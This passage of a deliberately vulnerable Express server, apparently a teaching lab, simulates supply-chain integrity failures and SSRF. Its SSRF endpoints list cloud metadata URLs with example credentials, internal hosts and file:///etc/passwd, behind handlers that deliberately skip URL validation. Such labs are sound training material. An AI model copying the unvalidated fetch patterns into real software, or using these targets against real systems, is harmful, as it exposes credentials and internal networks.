  console.log('🔓 DEPENDENCY SCAN REQUESTED:', { timestamp: new Date().toISOString() });
  
  const dependencies = [
    { name: 'express', version: '4.18.2', status: '✅ Secure' },
    { name: 'lodash', version: '4.17.21', status: '✅ Secure' },
    { name: 'malicious-package', version: '1.0.0', status: '⚠️ Compromised' },
    { name: 'vulnerable-lib', version: '2.1.0', status: '❌ Vulnerable' },
    { name: 'backdoor-module', version: '3.0.1', status: '⚠️ Suspicious' }
  ];
  
  res.json({
    success: true,
    totalDependencies: dependencies.length,
    vulnerableDependencies: 2,
    compromisedPackages: 1,
    riskLevel: 'High',
    dependencies: dependencies
  });
});

// Install dependency endpoint
app.post('/api/integrity/install-dependency', (req, res) => {
  const { packageName } = req.body;
  
  // WARNING: No integrity verification of package
  console.log('🔓 DEPENDENCY INSTALLATION REQUESTED:', { packageName, timestamp: new Date().toISOString() });
  
  res.json({
    success: true,
    packageName: packageName,
    version: '1.0.0',
    integrityVerified: false,
    maliciousCode: true,
    vulnerability: 'No package integrity verification'
  });
});

// Build project endpoint
app.post('/api/integrity/build-project', (req, res) => {
  // WARNING: No integrity verification during build
  console.log('🔓 PROJECT BUILD REQUESTED:', { timestamp: new Date().toISOString() });
  
  res.json({
    success: true,
    buildStatus: 'Success',
    maliciousCodeExecuted: true,
    backdoorInstalled: true,
    dataExfiltrated: true,
    vulnerability: 'Compromised dependencies in build process',
    impact: 'Complete application compromise'
  });
});

// Trigger build endpoint
app.post('/api/integrity/trigger-build', (req, res) => {
  // WARNING: No integrity verification of build scripts
  console.log('🔓 BUILD TRIGGER REQUESTED:', { timestamp: new Date().toISOString() });
  
  res.json({
    success: true,
    buildId: 'build-2024-001',
    status: 'In Progress',
    scriptVerified: false,
    maliciousCodeInjected: true,
    vulnerability: 'No build script integrity verification'
  });
});

// Deploy application endpoint
app.post('/api/integrity/deploy-app', (req, res) => {
  // WARNING: No integrity verification of deployment
  console.log('🔓 APPLICATION DEPLOYMENT REQUESTED:', { timestamp: new Date().toISOString() });
  
  res.json({
    success: true,
    deploymentId: 'deploy-2024-001',
    status: 'Deployed',
    url: 'https://malicious-app.example.com',
    maliciousCodeDeployed: true,
    vulnerability: 'No deployment integrity verification'
  });
});

// Verify deployment endpoint
app.post('/api/integrity/verify-deployment', (req, res) => {
  // WARNING: No integrity verification of deployed application
  console.log('🔓 DEPLOYMENT VERIFICATION REQUESTED:', { timestamp: new Date().toISOString() });
  
  res.json({
    success: true,
    deploymentStatus: 'Active',
    maliciousCodeActive: true,
    backdoorAccess: true,
    dataCompromised: true,
    vulnerability: 'CI/CD pipeline compromise',
    impact: 'Complete system breach'
  });
});

// A10:2021 - Server-Side Request Forgery (SSRF) Vulnerabilities

// Network scanning endpoint (vulnerable to SSRF)
app.post('/api/ssrf/network-scan', async (req, res) => {
  const { url } = req.body;
  
  if (!url) {
    return res.status(400).json({ success: false, error: 'URL is required' });
  }
  
  // WARNING: No URL validation - vulnerable to SSRF
  console.log('🔓 SSRF NETWORK SCAN REQUESTED:', { 
    url, 
    timestamp: new Date().toISOString(),
    ip: req.ip,
    userAgent: req.get('User-Agent')
  });
  
  try {
    // Simulate internal network scanning
    const internalServices = {
      'http://192.168.1.1': {
        status: '200 OK',
        response: 'Router Admin Panel\nModel: TP-Link Archer C7\nFirmware: v2.0.0\nAdmin Interface Active'
      },
      'http://192.168.1.10': {
        status: '200 OK',
        response: 'Internal Web Server\nApache/2.4.41\nDocument Root: /var/www/html\nStatus: Active'
      },
      'http://192.168.1.20': {
        status: '200 OK',
        response: 'Database Server\nMySQL 8.0.26\nPort: 3306\nStatus: Running'
      },
      'http://192.168.1.30': {
        status: '200 OK',
        response: 'File Server\nSamba 4.13.0\nShares: /shared, /backup\nStatus: Online'
      },
      'http://10.0.0.1': {
        status: '200 OK',
        response: 'Network Gateway\nCisco Router\nInterface: eth0\nStatus: Operational'
      },
      'http://172.16.0.1': {
        status: '200 OK',
        response: 'Internal API Gateway\nNode.js Server\nPort: 3000\nStatus: Running'
      }
    };
    
    const service = internalServices[url] || {
      status: '404 Not Found',
      response: 'Service not found or not accessible'
    };
    
    res.json({
      success: true,
      url: url,
      status: service.status,
      response: service.response,
      vulnerability: 'SSRF allows internal network scanning'
    });
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Failed to scan network',
      details: error.message
    });
  }
});

// Cloud metadata access endpoint (vulnerable to SSRF)
app.post('/api/ssrf/metadata-access', async (req, res) => {
  const { endpoint } = req.body;
  
  if (!endpoint) {
    return res.status(400).json({ success: false, error: 'Endpoint is required' });
  }
  
  // WARNING: No validation - vulnerable to SSRF
  console.log('🔓 SSRF METADATA ACCESS REQUESTED:', { 
    endpoint, 
    timestamp: new Date().toISOString(),
    ip: req.ip,
    userAgent: req.get('User-Agent')
  });
  
  try {
    // Simulate cloud metadata access
    const metadataServices = {
      'http://169.254.169.254/latest/meta-data/': {
        status: '200 OK',
        metadata: `ami-id: ami-12345678
instance-id: i-1234567890abcdef0
instance-type: t3.micro
availability-zone: us-east-1a
security-groups: default
iam/security-credentials/ec2-role: {
  "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "AQoEXAMPLEH4aoAH0gNCAPyJxz4BlCFFxWNE1OPTgk5TthT..."
}`
      },
      'http://169.254.169.254/metadata/v1/': {
        status: '200 OK',
        metadata: `droplet_id: 12345678
hostname: web-01
region: nyc1
interfaces: {
  "public": [{"ipv4": {"ip_address": "192.168.1.100"}}],
  "private": [{"ipv4": {"ip_address": "10.0.0.100"}}]
}
ssh_keys: [12345, 67890]
user_data: #!/bin/bash
echo "Hello from user data!"`
      },
      'http://metadata.google.internal/computeMetadata/v1/': {
        status: '200 OK',
        metadata: `instance/name: web-server-01
instance/id: 1234567890123456789
project/project-id: my-project-123
service-accounts/default/token: ya29.a0AfH6SMC...
service-accounts/default/email: default@my-project-123.iam.gserviceaccount.com`
      }
    };
    
    const metadata = metadataServices[endpoint] || {
      status: '404 Not Found',
      metadata: 'Metadata service not found or not accessible'
    };
    
    res.json({
      success: true,
      endpoint: endpoint,
      status: metadata.status,
      metadata: metadata.metadata,
      vulnerability: 'SSRF allows access to cloud metadata services'
    });
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Failed to access metadata',
      details: error.message
    });
  }
});

// Internal service exploitation endpoint (vulnerable to SSRF)
app.post('/api/ssrf/internal-service', async (req, res) => {
  const { url, payload } = req.body;
  
  if (!url) {
    return res.status(400).json({ success: false, error: 'URL is required' });
  }
  
  // WARNING: No validation - vulnerable to SSRF
  console.log('🔓 SSRF INTERNAL SERVICE REQUESTED:', { 
    url, 
    payload,
    timestamp: new Date().toISOString(),
    ip: req.ip,
    userAgent: req.get('User-Agent')
  });
  
  try {
    // Simulate internal service interaction
    const internalServices = {
      'http://internal-api:8080': {
        status: '200 OK',
        response: `API Response:
Method: POST
Payload: ${payload || 'No payload'}
Status: Processed
Internal Data: {
  "users": 150,
  "orders": 1250,
  "revenue": "$45,230.50"
}`
      },
      'http://admin-panel:3000': {
        status: '200 OK',
        response: `Admin Panel Response:
Action: ${payload || 'Default action'}
Status: Executed
System Info: {
  "os": "Ubuntu 20.04",
  "memory": "8GB",
  "disk": "500GB",
  "services": ["nginx", "mysql", "redis"]
}`
      },
      'http://database:3306': {
        status: '200 OK',
        response: `Database Response:
Query: ${payload || 'SELECT * FROM users'}
Result: 150 rows returned
Tables: users, orders, products, logs
Size: 2.5GB`
      },
      'http://redis:6379': {
        status: '200 OK',
        response: `Redis Response:
Command: ${payload || 'INFO'}
Status: Connected
Keys: 1250
Memory: 512MB
Clients: 5`
      }
    };
    
    const service = internalServices[url] || {
      status: '404 Not Found',
      response: 'Internal service not found or not accessible'
    };
    
    res.json({
      success: true,
      url: url,
      payload: payload || 'No payload',
      status: service.status,
      response: service.response,
      vulnerability: 'SSRF allows interaction with internal services'
    });
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Failed to interact with internal service',
      details: error.message
    });
  }
});

// Vulnerable URL fetcher (demonstrates SSRF)
app.get('/api/ssrf/fetch', async (req, res) => {
  const url = req.query.url;
  
  if (!url) {
    return res.status(400).json({ error: 'URL parameter is required' });
  }
  
  // WARNING: No URL validation - vulnerable to SSRF
  console.log('🔓 SSRF FETCH REQUESTED:', { 
    url, 
    timestamp: new Date().toISOString(),
    ip: req.ip,
    userAgent: req.get('User-Agent')
  });
  
  try {
    // Simulate fetching from various sources
    const responses = {
      'https://api.example.com/data': '{"status": "success", "data": "External API response"}',
      'http://192.168.1.1': 'Router Admin Panel - Internal Network Access',
      'http://169.254.169.254/latest/meta-data/': 'AWS EC2 Metadata Service - Cloud Credentials',
      'http://internal-api:8080': 'Internal API Response - Service Discovery',
      'file:///etc/passwd': 'root:x:0:0:root:/root:/bin/bash - File System Access'
    };
    
    const response = responses[url] || 'Resource not found or not accessible';
    
    res.json({
      success: true,
      url: url,
      response: response,
      vulnerability: 'SSRF allows access to unauthorized resources'
    });
    
  } catch (error) {
    res.status(500).json({
      success: false,
      error: 'Failed to fetch URL',
      details: error.message
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running on http://localhost:${PORT}`);
  console.log('⚠️  WARNING: This server contains intentionally vulnerable code for educational purposes only!');
  console.log('⚠️  DO NOT deploy in production environments!');
});
